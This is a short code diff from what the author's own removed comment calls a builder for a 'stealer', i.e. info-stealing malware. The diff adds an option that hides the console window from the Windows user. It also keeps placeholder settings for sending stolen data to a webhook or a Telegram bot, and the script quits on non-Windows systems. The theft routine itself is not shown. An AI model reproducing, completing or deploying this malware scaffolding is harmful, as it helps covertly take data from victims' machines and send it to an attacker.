@@ -1,12 +1,23 @@
+#FOR BUILDER
 try:
-    from config import WEBHOOK_URL, WEBHOOK_STYLE, TELEGRAM_BOT_TOKEN, TELEGRAM_USER_ID, TELEGRAM_STYLE#I am writing a builder for a stealer, it will come in handy later.
+    from config import WEBHOOK_URL, WEBHOOK_STYLE, TELEGRAM_BOT_TOKEN, TELEGRAM_USER_ID, TELEGRAM_STYLE, CONSOLE_HIDE
 except:
+    #If Paste
+    CONSOLE_HIDE = True
+
     WEBHOOK_URL = 'PASTE WEBHOOK HERE'
     WEBHOOK_STYLE = True
-
     TELEGRAM_STYLE = False
     TELEGRAM_BOT_TOKEN = 'PASTE BOT TOKEN: https://t.me/botfather'
     TELEGRAM_USER_ID = 'PASTE U CHAT ID: https://t.me/getmyid_bot'
+if CONSOLE_HIDE:
+    try:
+        import win32gui, win32con
+
+        the_program_to_hide = win32gui.GetForegroundWindow()
+        win32gui.ShowWindow(the_program_to_hide , win32con.SW_HIDE)
+    except:
+        pass
 
 import os
 if os.name != "nt": exit()
